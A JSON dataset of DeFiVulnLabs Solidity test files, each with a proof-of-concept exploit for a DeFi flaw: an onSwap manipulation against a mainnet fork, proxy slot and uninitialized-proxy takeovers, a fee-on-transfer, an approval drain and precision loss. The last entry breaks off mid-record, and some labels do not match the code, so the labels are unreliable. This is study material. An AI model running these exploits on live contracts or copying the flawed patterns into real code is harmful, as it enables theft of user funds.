[
  {
    "id": "defivulnlabs_sensefinance_exp",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "SenseFinance_exp.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// this excersise is about direct token manipulation\n\ninterface ISpace {\n    function onSwap(\n        SwapRequest memory request,\n        uint256 reservesTokenIn,\n        uint256 reservesTokenOut\n    ) external returns (uint256);\n\n    struct SwapRequest {\n        IVault.SwapKind kind;\n        IERC20 tokenIn;\n        IERC20 tokenOut;\n        uint256 amount;\n        // Misc data\n        bytes32 poolId;\n        uint256 lastChangeBlock;\n        address from;\n        address to;\n        bytes userData;\n    }\n}\n\ninterface IVault {\n    enum SwapKind {\n        GIVEN_IN,\n        GIVEN_OUT\n    }\n}\n\ncontract ContractTest is DSTest {\n    ISpace space = ISpace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);\n    IVault.SwapKind kind = IVault.SwapKind(0);\n    ISpace.SwapRequest aad =\n        ISpace.SwapRequest(\n            kind,\n            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),\n            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),\n            2000000000000000000,\n            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,\n            15017009,\n            address(this),\n            address(this),\n            \"\"\n        );\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15017009); //fork mainnet at block 15017009\n    }\n\n    function testExploit() public {\n        //onswap:reservesTokenIn, reservesTokenOut;\n        console.log(\n            \"Amount Calculated:\",\n            space.onSwap(\n                aad,\n                60000000000000000000000000000000,\n                20000000000000000000000000\n            )\n        ); //744039785002747962\n        console.log(\n            \"Manipulated Amount Calculated:\",\n            space.onSwap(aad, 2000000000000000000, 2000000000000000000)\n        ); //1860147027671744844\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/SenseFinance_exp.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_immunefi_ch2",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Immunefi_ch2.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n",
    "vulnerable_contract_only": "contract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Immunefi_ch2.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_fee-on-transfer",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "fee-on-transfer.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: STA token had a deflationary model with transfer fee of 1% charged from a recipient.\n\nDescription:\nThe actual deposited amount might be lower than the specified depositAmount of the function parameter.\n\nVulnVault: Incompatability with deflationary / fee-on-transfer tokens\n\nMitigation:  \nTransfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1671084918506684418\nhttps://medium.com/1inch-network/balancer-hack-2020-a8f7131c980e\nhttps://twitter.com/BlockSecTeam/status/1600442137811689473\n*/\n\ncontract ContractTest is Test {\n    STA STAContract;\n    VulnVault VulnVaultContract;\n    Vault VaultContract;\n\n    function setUp() public {\n        STAContract = new STA();\n        VulnVaultContract = new VulnVault(address(STAContract));\n        VaultContract = new Vault(address(STAContract));\n    }\n\n    function testVulnFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VulnVaultContract), type(uint256).max);\n        VulnVaultContract.deposit(10000);\n        //VulnVaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000 STA, but Alice's STA balance in VulnVaultContract:\",\n            VulnVaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VulnVaultContract)),\n            VulnVaultContract.getBalance(alice)\n        );\n    }\n\n    function testFeeOnTransfer() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        STAContract.balanceOf(address(this));\n        STAContract.transfer(alice, 1000000);\n        console.log(\"Alice's STA balance:\", STAContract.balanceOf(alice)); // charge 1% fee\n        vm.startPrank(alice);\n        STAContract.approve(address(VaultContract), type(uint256).max);\n        VaultContract.deposit(10000);\n        //VaultContract.getBalance(alice);\n\n        console.log(\n            \"Alice deposit 10000, Alice's STA balance in VaultContract:\",\n            VaultContract.getBalance(alice)\n        ); // charge 1% fee\n        assertEq(\n            STAContract.balanceOf(address(VaultContract)),\n            VaultContract.getBalance(alice)\n        );\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address who) external view returns (uint256);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint256);\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function approve(address spender, uint256 value) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a / b;\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        assert(b <= a);\n        return a - b;\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        assert(c >= a);\n        return c;\n    }\n\n    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n        uint256 c = add(a, m);\n        uint256 d = sub(c, 1);\n        return mul(div(d, m), m);\n    }\n}\n\nabstract contract ERC20Detailed is IERC20 {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\ncontract STA is ERC20Detailed {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowed;\n\n    string constant tokenName = \"Statera\";\n    string constant tokenSymbol = \"STA\";\n    uint8 constant tokenDecimals = 18;\n    uint256 _totalSupply = 100000000000000000000000000;\n    uint256 public basePercent = 100;\n\n    constructor()\n        public\n        payable\n        ERC20Detailed(tokenName, tokenSymbol, tokenDecimals)\n    {\n        _issue(msg.sender, _totalSupply);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address owner) public view returns (uint256) {\n        return _balances[owner];\n    }\n\n    function allowance(\n        address owner,\n        address spender\n    ) public view returns (uint256) {\n        return _allowed[owner][spender];\n    }\n\n    function cut(uint256 value) public view returns (uint256) {\n        uint256 roundValue = value.ceil(basePercent);\n        uint256 cutValue = roundValue.mul(basePercent).div(10000);\n        return cutValue;\n    }\n\n    function transfer(address to, uint256 value) public returns (bool) {\n        require(value <= _balances[msg.sender]);\n        require(to != address(0));\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[msg.sender] = _balances[msg.sender].sub(value);\n        _balances[to] = _balances[to].add(tokensToTransfer);\n\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        emit Transfer(msg.sender, to, tokensToTransfer);\n        emit Transfer(msg.sender, address(0), tokensToBurn);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) public returns (bool) {\n        require(value <= _balances[from]);\n        require(value <= _allowed[from][msg.sender]);\n        require(to != address(0));\n\n        _balances[from] = _balances[from].sub(value);\n\n        uint256 tokensToBurn = cut(value);\n        uint256 tokensToTransfer = value.sub(tokensToBurn);\n\n        _balances[to] = _balances[to].add(tokensToTransfer);\n        _totalSupply = _totalSupply.sub(tokensToBurn);\n\n        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n\n        emit Transfer(from, to, tokensToTransfer);\n        emit Transfer(from, address(0), tokensToBurn);\n\n        return true;\n    }\n\n    function upAllowance(\n        address spender,\n        uint256 addedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].add(addedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function downAllowance(\n        address spender,\n        uint256 subtractedValue\n    ) public returns (bool) {\n        require(spender != address(0));\n        _allowed[msg.sender][spender] = (\n            _allowed[msg.sender][spender].sub(subtractedValue)\n        );\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n        return true;\n    }\n\n    function _issue(address account, uint256 amount) internal {\n        require(amount != 0);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    function destroy(uint256 amount) external {\n        _destroy(msg.sender, amount);\n    }\n\n    function _destroy(address account, uint256 amount) internal {\n        require(amount != 0);\n        require(amount <= _balances[account]);\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[account] = _balances[account].sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    function destroyFrom(address account, uint256 amount) external {\n        require(amount <= _allowed[account][msg.sender]);\n        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(\n            amount\n        );\n        _destroy(account, amount);\n    }\n}\n\n//vulnerable vault\ncontract VulnVault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        token.transferFrom(msg.sender, address(this), amount);\n        balances[msg.sender] += amount;\n        emit Deposit(msg.sender, amount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n\n//Mitigated vault\ncontract Vault {\n    mapping(address => uint256) private balances;\n    uint256 private fee;\n    IERC20 private token;\n\n    event Deposit(address indexed depositor, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n\n    constructor(address _tokenAddress) {\n        token = IERC20(_tokenAddress);\n    }\n\n    function deposit(uint256 amount) external {\n        require(amount > 0, \"Deposit amount must be greater than zero\");\n\n        uint256 balanceBefore = token.balanceOf(address(this));\n\n        token.transferFrom(msg.sender, address(this), amount);\n\n        uint256 balanceAfter = token.balanceOf(address(this));\n        uint256 actualDepositAmount = balanceAfter - balanceBefore;\n\n        balances[msg.sender] += actualDepositAmount;\n        emit Deposit(msg.sender, actualDepositAmount);\n    }\n\n    function withdraw(uint256 amount) external {\n        require(amount > 0, \"Withdrawal amount must be greater than zero\");\n        require(amount <= balances[msg.sender], \"Insufficient balance\");\n\n        balances[msg.sender] -= amount;\n        token.transfer(msg.sender, amount);\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    function getBalance(address account) external view returns (uint256) {\n        return balances[account];\n    }\n}\n",
    "vulnerable_contract_only": "contract ERC20Detailed {\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor(\n        string memory name,\n        string memory symbol,\n        uint8 decimals\n    ) internal {\n        _name = name;\n        _symbol = symbol;\n        _decimals = decimals;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "token_incompatibility",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "STA token had a deflationary model with transfer fee of 1% charged from a recipient.",
    "description": "The actual deposited amount might be lower than the specified depositAmount of the function parameter.",
    "scenario": "",
    "fix_description": "Transfer the tokens first and compare pre-/after token balances to compute the actual deposited amount.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/fee-on-transfer.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_approvescam",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "ApproveScam.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Over-Permissive Approve Scam\n\nDescription:\nThis vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.\n\nMitigation:\nUsers should only approve the amount of tokens necessary for the operation at hand. \n*/\n\ncontract ContractTest is Test {\n    ERC20 ERC20Contract;\n    address alice = vm.addr(1);\n    address eve = vm.addr(2);\n\n    function testApproveScam() public {\n        ERC20Contract = new ERC20();\n        ERC20Contract.mint(1000);\n        ERC20Contract.transfer(address(alice), 1000);\n\n        vm.prank(alice);\n        // Be Careful to grant unlimited amount to unknown website/address.\n        // Do not perform approve, if you are sure it's from a legitimate website.\n        // Alice granted approval permission to Eve.\n        ERC20Contract.approve(address(eve), type(uint256).max);\n\n        console.log(\n            \"Before exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\n            \"Due to Alice granted transfer permission to Eve, now Eve can move funds from Alice\"\n        );\n        vm.prank(eve);\n        // Now, Eve can move funds from Alice.\n        ERC20Contract.transferFrom(address(alice), address(eve), 1000);\n        console.log(\n            \"After exploiting, Balance of Eve:\",\n            ERC20Contract.balanceOf(eve)\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n\n    function balanceOf(address account) external view returns (uint);\n\n    function transfer(address recipient, uint amount) external returns (bool);\n\n    function allowance(\n        address owner,\n        address spender\n    ) external view returns (uint);\n\n    function approve(address spender, uint amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ERC20 is IERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "vulnerable_contract_only": "contract ERC20 {\n    uint public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n    string public name = \"Test example\";\n    string public symbol = \"Test\";\n    uint8 public decimals = 18;\n\n    function transfer(address recipient, uint amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "approval_scam",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Over-Permissive Approve Scam",
    "description": "This vulnerability is associated with the approval process in ERC20 tokens. \nIn this scenario, Alice approves Eve to transfer an unlimited (type(uint256).max) amount of tokens \nfrom Alice's account. Later, Eve exploits this permission and transfers 1000 tokens from Alice's account to hers.\n\nMost current scams use approve or setApprovalForAll to defraud your transfer rights. Be especially careful with this part.",
    "scenario": "",
    "fix_description": "Users should only approve the amount of tokens necessary for the operation at hand.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/ApproveScam.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_precision-loss",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Precision-loss.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Precision Loss - rounding down to zero\n\nDescription:\nSupport all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.\n\nMitigation:  \nAvoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified\n\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1675805135061286914\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/244\nhttps://github.com/sherlock-audit/2023-02-surge-judging/issues/122\nhttps://dacian.me/precision-loss-errors#heading-rounding-down-to-zero\n*/\n\ncontract ContractTest is Test {\n    SimplePool SimplePoolContract;\n\n    function setUp() public {\n        SimplePoolContract = new SimplePool();\n    }\n\n    function testRounding_error() public view {\n        SimplePoolContract.getCurrentReward();\n    }\n\n    receive() external payable {}\n}\n\ncontract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "vulnerable_contract_only": "contract SimplePool {\n    uint public totalDebt;\n    uint public lastAccrueInterestTime;\n    uint public loanTokenBalance;\n\n    constructor() {\n        totalDebt = 10000e6; //debt token is USDC and has 6 digit decimals.\n        lastAccrueInterestTime = block.timestamp - 1;\n        loanTokenBalance = 500e18;\n    }\n\n    function getCurrentReward() public view returns (uint _reward) {\n        // Get the time passed since the last interest accrual\n        uint _timeDelta = block.timestamp - lastAccrueInterestTime; //_timeDelta=1\n\n        // If the time passed is 0, return 0 reward\n        if (_timeDelta == 0) return 0;\n\n        // Calculate the supplied value\n        // uint _supplied = totalDebt + loanTokenBalance;\n        //console.log(_supplied);\n        // Calculate the reward\n        _reward = (totalDebt * _timeDelta) / (365 days * 1e18);\n        console.log(\"Current reward\", _reward);\n\n        // 31536000 is the number of seconds in a year\n        // 365 days * 1e18 = 31_536_000_000_000_000_000_000_000\n        //_totalDebt * _timeDelta / 31_536_000_000_000_000_000_000_000\n        // 10_000_000_000 * 1 / 31_536_000_000_000_000_000_000_000 // -> 0\n        _reward;\n    }\n}\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "precision_loss",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "Precision Loss - rounding down to zero",
    "description": "Support all the ERC20 tokens, as those tokens may have different decimal places. \nFor example, USDT and USDC have 6 decimals. So, in the calculations, one must be careful.",
    "scenario": "",
    "fix_description": "Avoid any situation that if the numerator is smaller than the denominator, the result will be zero.\nRounding down related issues can be avoided in many ways:\n    1.Using libraries for rounding up/down as expected\n    2.Requiring result is not zero or denominator is <= numerator\n    3.Refactor operations for avoiding first dividing then multiplying, when first dividing then multiplying, precision lost is amplified",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Precision-loss.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_uninitialized_variables",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Uninitialized_variables.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n/*\nName: Uninitialized variable Vulnerability\n\nDescription:\nUninitialized local storage variables may contain the value of other storage variables in the contract; \nthis fact can cause unintentional vulnerabilities, or be exploited deliberately.\n\nREF:\nhttps://blog.dixitaditya.com/ethernaut-level-25-motorbike\n*/\n\ncontract ContractTest is Test {\n    Engine EngineContract;\n    Motorbike MotorbikeContract;\n    Attack AttackContract;\n\n    function testUninitialized() public {\n        EngineContract = new Engine();\n        MotorbikeContract = new Motorbike(address(EngineContract));\n        AttackContract = new Attack();\n\n        // Engine contract is not initialized\n        console.log(\"Unintialized Upgrader:\", EngineContract.upgrader());\n        // Malicious user calls initialize() on Engine contract to become upgrader.\n        address(EngineContract).call(abi.encodeWithSignature(\"initialize()\"));\n        // Malicious user becomes the upgrader\n        console.log(\"Initialized Upgrader:\", EngineContract.upgrader());\n\n        // Upgrade the implementation of the proxy to a malicious contract and call `attack()`\n        bytes memory initEncoded = abi.encodeWithSignature(\"attack()\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n\n        console.log(\"Exploit completed\");\n        console.log(\"Since EngineContract destroyed, next call will fail.\");\n        address(EngineContract).call(\n            abi.encodeWithSignature(\n                \"upgradeToAndCall(address,bytes)\",\n                address(AttackContract),\n                initEncoded\n            )\n        );\n    }\n}\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) {\n        require(\n            Address.isContract(_logic),\n            \"ERC1967: new implementation is not a contract\"\n        );\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success, ) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(\n                gas(),\n                implementation,\n                0,\n                calldatasize(),\n                0,\n                0\n            )\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the contract matches the call data\n    fallback() external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(\n        bytes32 slot\n    ) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r.slot := slot\n        }\n    }\n}\n\ncontract Engine is Initializable {\n    // keccak-256 